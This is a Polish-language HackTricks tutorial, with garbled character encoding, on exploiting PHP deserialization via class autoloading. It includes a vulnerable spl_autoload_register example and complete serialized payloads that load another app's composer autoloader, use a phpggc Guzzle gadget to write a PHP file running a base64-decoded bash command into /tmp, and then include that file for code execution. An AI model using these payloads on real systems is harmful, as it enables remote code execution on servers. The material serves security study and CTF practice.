# PHP - Deserializacja + Autoloadowanie klas

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Najpierw powinieneÅ› sprawdziÄ‡, czym sÄ… [**Autoloadowanie klas**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserializacja + spl\_autoload\_register + LFI/Gadget

JesteÅ›my w sytuacji, gdzie znaleÅºliÅ›my **deserializacjÄ™ PHP w aplikacji internetowej**, ale **brak** biblioteki podatnej na gadÅ¼ety wewnÄ…trz **`phpggc`**. Jednak w tym samym kontenerze znajdowaÅ‚a siÄ™ **inna aplikacja internetowa z podatnymi bibliotekami**. Celem byÅ‚o **zaÅ‚adowanie Å‚adowacza kompozytora innej aplikacji internetowej** i wykorzystanie go do **zaÅ‚adowania gadÅ¼etu, ktÃ³ry wykorzysta tÄ™ bibliotekÄ™ z gadÅ¼etem** z aplikacji podatnej na deserializacjÄ™.

Kroki:

* ZnalazÅ‚eÅ› **deserializacjÄ™**, ale w obecnym kodzie aplikacji **nie ma Å¼adnego gadÅ¼etu**
* MoÅ¼esz wykorzystaÄ‡ funkcjÄ™ **`spl_autoload_register`** w nastÄ™pujÄ…cy sposÃ³b, aby **zaÅ‚adowaÄ‡ dowolny lokalny plik z rozszerzeniem `.php`**
* W tym celu uÅ¼ywasz deserializacji, gdzie nazwa klasy bÄ™dzie znajdowaÄ‡ siÄ™ w zmiennej **`$name`**. Nie moÅ¼esz uÅ¼ywaÄ‡ "/" ani "." w nazwie klasy w obiekcie zserializowanym, ale **kod** **zamienia** **podkreÅ›lenia** ("\_") **na ukoÅ›niki** ("/"). Na przykÅ‚ad nazwa klasy `tmp_passwd` zostanie przeksztaÅ‚cona na `/tmp/passwd.php`, a kod sprÃ³buje jÄ… zaÅ‚adowaÄ‡.\
PrzykÅ‚adem gadÅ¼etu bÄ™dzie: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
JeÅ›li masz **przesyÅ‚anie plikÃ³w** i moÅ¼esz przesÅ‚aÄ‡ plik z rozszerzeniem **`.php`**, moÅ¼esz **bezpoÅ›rednio wykorzystaÄ‡ tÄ™ funkcjonalnoÅ›Ä‡** i uzyskaÄ‡ juÅ¼ RCE.
{% endhint %}

W moim przypadku nie miaÅ‚em czegoÅ› takiego, ale w tym samym kontenerze znajdowaÅ‚a siÄ™ inna strona internetowa z bibliotekÄ… podatnÄ… na gadÅ¼et `phpggc`.

* Aby zaÅ‚adowaÄ‡ tÄ™ innÄ… bibliotekÄ™, najpierw musisz **zaÅ‚adowaÄ‡ Å‚adowacz kompozytora tej innej aplikacji internetowej** (poniewaÅ¼ Å‚adowacz bieÅ¼Ä…cej aplikacji nie bÄ™dzie miaÅ‚ dostÄ™pu do bibliotek drugiej aplikacji). **ZnajÄ…c Å›cieÅ¼kÄ™ aplikacji**, moÅ¼esz to bardzo Å‚atwo osiÄ…gnÄ…Ä‡ za pomocÄ…: **`O:28:"www_frontend_vendor_autoload":0:{}`** (W moim przypadku Å‚adowacz kompozytora znajdowaÅ‚ siÄ™ w `/www/frontend/vendor/autoload.php`)
* Teraz moÅ¼esz **zaÅ‚adowaÄ‡** Å‚adowacz **innej aplikacji**, wiÄ™c teraz czas na **wygenerowanie Å‚adunku phpggc**. W moim przypadku uÅ¼yÅ‚em **`Guzzle/FW1`**, co pozwoliÅ‚o mi **zapisaÄ‡ dowolny plik w systemie plikÃ³w**.
* UWAGA: **Wygenerowany gadÅ¼et nie dziaÅ‚aÅ‚**, aby zadziaÅ‚aÅ‚, **zmodyfikowaÅ‚em** ten Å‚adunek **`chain.php`** z phpggc i ustawiÅ‚em **wszystkie atrybuty** klas **z prywatnych na publiczne**. W przeciwnym razie po zdeserializowaniu ciÄ…gu znakÃ³w atrybuty utworzonych obiektÃ³w nie miaÅ‚y Å¼adnych wartoÅ›ci.
* Teraz mamy sposÃ³b na **zaÅ‚adowanie Å‚adowacza innej aplikacji** i mamy dziaÅ‚ajÄ…cy Å‚adunek phpggc, ale musimy to zrobiÄ‡ w **TAKIM SAMYM ZAPYTANIU, aby Å‚adowacz zostaÅ‚ zaÅ‚adowany podczas uÅ¼ycia gadÅ¼etu**. W tym celu wysÅ‚aÅ‚em zserializowany tablicowy obiekt z obiema aplikacjami, tak jak poniÅ¼ej:
* MoÅ¼esz zobaczyÄ‡, **jak najpierw Å‚adowany jest Å‚adowacz, a nastÄ™pnie Å‚adunek**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Teraz moÅ¼emy **utworzyÄ‡ i zapisaÄ‡ plik**, jednak uÅ¼ytkownik **nie moÅ¼e zapisywaÄ‡ w Å¼adnym folderze wewnÄ…trz serwera sieciowego**. Jak widaÄ‡ w Å‚adunku, PHP wywoÅ‚uje **`system`** z pewnym **base64** i tworzy go w **`/tmp/a.php`**. NastÄ™pnie moÅ¼emy **ponownie uÅ¼yÄ‡ pierwszego rodzaju Å‚adunku**, ktÃ³ry uÅ¼yliÅ›my jako LFI, aby zaÅ‚adowaÄ‡ Å‚adowacz kompozytora innego webapp **do zaÅ‚adowania wygenerowanego pliku `/tmp/a.php`**. Wystarczy dodaÄ‡ go do gadÅ¼etu deserializacji:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Podsumowanie payloadu**

* **ZaÅ‚aduj autoloader kompozytora** innego webappu w tym samym kontenerze
* **ZaÅ‚aduj gadÅ¼et phpggc**, aby wykorzystaÄ‡ bibliotekÄ™ innego webappu (poczÄ…tkowy webapp podatny na deserializacjÄ™ nie miaÅ‚ Å¼adnego gadÅ¼etu w swoich bibliotekach)
* GadÅ¼et **utworzy plik z Å‚adunkiem PHP** w /tmp/a.php z zÅ‚oÅ›liwymi poleceniami (uÅ¼ytkownik webappu nie moÅ¼e zapisywaÄ‡ w Å¼adnym folderze Å¼adnego webappu)
* Ostatnia czÄ™Å›Ä‡ naszego payloadu **zaÅ‚aduje wygenerowany plik php**, ktÃ³ry wykona polecenia

MusiaÅ‚em **wywoÅ‚aÄ‡ tÄ™ deserializacjÄ™ dwukrotnie**. W moim teÅ›cie, za pierwszym razem plik `/tmp/a.php` zostaÅ‚ utworzony, ale nie zaÅ‚adowany, a za drugim razem zostaÅ‚ poprawnie zaÅ‚adowany.

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
